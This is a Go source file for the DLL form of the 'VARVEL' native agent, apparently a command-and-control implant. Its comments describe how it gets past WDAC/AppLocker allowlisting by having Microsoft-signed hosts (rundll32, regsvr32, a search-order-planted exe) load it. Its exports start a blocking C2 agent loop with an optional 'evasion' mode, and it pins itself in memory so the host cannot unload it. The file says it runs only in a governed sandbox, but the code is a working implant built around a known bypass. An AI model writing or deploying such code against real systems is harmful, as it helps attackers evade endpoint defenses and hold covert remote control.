//go:build varveldll

// proxydll.go — the DLL FORM of the VARVEL native agent (the payload half of the
// SIGNED-PROXY EXECUTION tier; the governance half is engine/execproxy.mjs).
//
// Build (cgo REQUIRED — buildmode=c-shared; the exe build stays cgo-free):
//
//	CGO_ENABLED=1 CC=<mingw-gcc> go build -tags varveldll -buildmode=c-shared \
//	  -ldflags="-s -w" -o varvel-agent.dll .
//
// THE WALL this exists for: a nation-tier endpoint runs application allowlisting
// (WDAC/AppLocker) — the unsigned varvel-agent.exe never executes there, and
// PowerShell is Constrained-Language + AMSI-watched. The standard nation-grade
// answer is SIGNED-PROXY EXECUTION: this DLL is byte-for-byte the same wire /
// HMAC / seq / exec-containment core as the exe (agent.go is shared verbatim),
// exported through a minimal C ABI so a Microsoft-SIGNED host binary
// (rundll32.exe / regsvr32.exe / a search-order-planted signed exe — copies in a
// governed sandbox only, never in-place) loads and runs it.
//
// Exported C ABI (deliberately minimal):
//
//	VarvelStatus(hwnd,hinst,cmdLine,show)  rundll32-class probe: writes ONE small
//	      status JSON marker file to the path in cmdLine (when given) and
//	      RETURNS IMMEDIATELY. Never starts the C2 loop. This is the export the
//	      governed live test uses to PROVE a Microsoft-signed binary really
//	      loaded and executed our code.
//	VarvelRun(configJson)                  the canonical C ABI entry: BLOCKING
//	      agent loop (same Agent as the exe). configJson is inline JSON or
//	      "@<path>" (proxyconf.go). Returns 0 on clean stop, 2 on bad config,
//	      3 on client build failure.
//	VarvelRunR(hwnd,hinst,cmdLine,show)    rundll32-callable alias of VarvelRun
//	      (the config rides the command tail, e.g. `@C:\...\run.json`).
//	DllRegisterServer/DllUnregisterServer  regsvr32-class: return S_OK and do
//	      NOTHING ELSE by design — no self-registration side effects; the call
//	      itself is the load-and-run proof. Honest scope, documented.
//
// Rundll32 signature note: every *R/Status export wears the documented
// rundll32 entry prototype (HWND, HINSTANCE, LPSTR, int); on x64 the single
// calling convention makes the fixed-arity Go export safe to call that way.
package main

/*
#include <stdint.h>
*/
import "C"

import (
	"context"
	"encoding/hex"
	"encoding/json"
	"log"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"
)

// statusMarker is the JSON VarvelStatus drops — the observable, inert proof that
// a signed host process loaded this DLL and executed its code.
type statusMarker struct {
	Marker  string `json:"marker"` // "varvel-agent-dll"
	Export  string `json:"export"`
	PID     int    `json:"pid"` // the HOST process's pid (rundll32/regsvr32/…) — proof of proxy execution
	Go      string `json:"go"`
	At      string `json:"at"`
	CmdLine string `json:"cmdLine,omitempty"` // the decoded command tail the host handed us
	RawHex  string `json:"rawHex,omitempty"`  // first 24 raw bytes (encoding forensics: rundll32 hands UTF-16LE)
}

var kernel32 = syscall.NewLazyDLL("kernel32.dll")
var procGetModuleFileName = kernel32.NewProc("GetModuleFileNameW")
var procGetModuleHandleEx = kernel32.NewProc("GetModuleHandleExW")

// Self-pin at load: bump our own module refcount so a host's FreeLibrary NEVER
// delivers DLL_PROCESS_DETACH. The Go runtime cannot be unloaded — detach makes
// rundll32 fast-fail 0xC0000409 AFTER the export returns (and hangs regsvr32 at
// teardown). Measured 2026-08-18 (Win11 24H2): with the pin, rundll32 exits
// cleanly. GetModuleHandleExW without UNCHANGED_REFCOUNT does the +1.
var selfPinAnchor byte

func init() {
	var h uintptr
	procGetModuleHandleEx.Call(0x4 /* GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS */, uintptr(unsafe.Pointer(&selfPinAnchor)), uintptr(unsafe.Pointer(&h)))
}

// ownPath resolves THIS DLL's on-disk path from the module handle the host
// loader passed to the entry point (hinst == our HMODULE).
func ownPath(hinst C.uintptr_t) string {
	if hinst == 0 {
		return ""
	}
	buf := make([]uint16, 32768)
	n, _, _ := procGetModuleFileName.Call(uintptr(hinst), uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
	if n == 0 || n >= uintptr(len(buf)) {
		return ""
	}
	return string(utf16.Decode(buf[:n]))
}

func writeStatus(outPath string, m statusMarker) error {
	m.Marker = "varvel-agent-dll"
	m.Export = "VarvelStatus"
	m.PID = os.Getpid()
	m.Go = runtime.Version()
	m.At = time.Now().UTC().Format(time.RFC3339)
	b, err := json.Marshal(m)
	if err != nil {
		return err
	}
	return os.WriteFile(outPath, b, 0o644)
}

func runFromConfigArg(arg string) C.int {
	cfg, err := loadProxyConfig(arg)
	if err != nil {
		return 2
	}
	a, err := agentFromConfig(cfg)
	if err != nil {
		return 3
	}
	// The honest launch note (exe launch-line parity): when evasion is ARMED the host
	// process is about to be patchable at task time — said out loud, never silent.
	log.Printf("varvel-agent.dll %s → %s · sandbox %s · evasion %s", a.ID, a.URL, a.Dir, evasionArmState(a.AllowEvasion))
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()
	defer a.stop()
	a.run(ctx, cfg.Once)
	return 0
}

// cmdLineToGo decodes the entry-point command tail. The x64 rundll32.exe is the
// UNICODE build and hands us a UTF-16LE buffer (the LPSTR prototype is a lie on
// modern Windows); a direct LoadLibrary/GetProcAddress caller hands us ANSI/UTF-8.
// Detect the wide case by the first NUL landing at an odd offset.
func cmdLineToGo(p *C.char) string {
	if p == nil {
		return ""
	}
	b := (*[1 << 20]byte)(unsafe.Pointer(p))
	if b[0] != 0 && b[1] == 0 {
		u := make([]uint16, 0, 260)
		for i := 0; ; i += 2 {
			v := uint16(b[i]) | uint16(b[i+1])<<8
			if v == 0 {
				break
			}
			u = append(u, v)
		}
		return string(utf16.Decode(u))
	}
	return C.GoString(p)
}

//export VarvelStatus
func VarvelStatus(hwnd C.uintptr_t, hinst C.uintptr_t, cmdLine *C.char, show C.int) C.int {
	out := strings.TrimSpace(cmdLineToGo(cmdLine))
	m := statusMarker{CmdLine: out}
	if cmdLine != nil {
		raw := (*[24]byte)(unsafe.Pointer(cmdLine))
		m.RawHex = hex.EncodeToString(raw[:])
	}
	if out == "" {
		// No usable command tail: drop the marker BESIDE THE DLL (resolved from
		// the module handle) so the load-and-run proof never depends on the
		// host's argument-passing quirks.
		if p := ownPath(hinst); p != "" {
			out = p + ".status.json"
		}
	}
	if out == "" {
		return 2
	}
	if err := writeStatus(out, m); err != nil {
		return 2
	}
	return 0
}

//export VarvelRun
func VarvelRun(configJson *C.char) C.int {
	if configJson == nil {
		return 2
	}
	return runFromConfigArg(C.GoString(configJson))
}

//export VarvelRunR
func VarvelRunR(hwnd C.uintptr_t, hinst C.uintptr_t, cmdLine *C.char, show C.int) C.int {
	return runFromConfigArg(cmdLineToGo(cmdLine))
}

//export DllRegisterServer
func DllRegisterServer() C.int { return 0 } // S_OK — regsvr32-class load proof; NO registration side effects by design

//export DllUnregisterServer
func DllUnregisterServer() C.int { return 0 } // S_OK — symmetric no-op
